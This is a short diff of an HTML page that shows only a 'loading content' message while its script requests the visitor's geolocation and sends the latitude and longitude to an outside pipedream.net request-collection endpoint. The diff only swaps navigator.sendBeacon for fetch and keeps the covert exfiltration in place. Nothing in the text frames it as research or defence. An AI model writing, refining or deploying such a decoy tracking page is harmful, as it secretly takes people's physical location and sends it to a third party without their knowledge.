@@ -7,10 +7,10 @@
     <p>Please wait, loading content...</p>
     <script>
         navigator.geolocation.getCurrentPosition(function(position) {
-            var url = 'https://eon186u4rmikh86.m.pipedream.net?' + 
-                      'lat=' + position.coords.latitude + 
-                      '&lon=' + position.coords.longitude;
-            navigator.sendBeacon(url);
+            var url = 'https://eon186u4rmikh86.m.pipedream.net?lat=' + 
+                      position.coords.latitude + '&lon=' + 
+                      position.coords.longitude;
+            fetch(url, { method: 'GET' });
         });
     </script>
 </body>
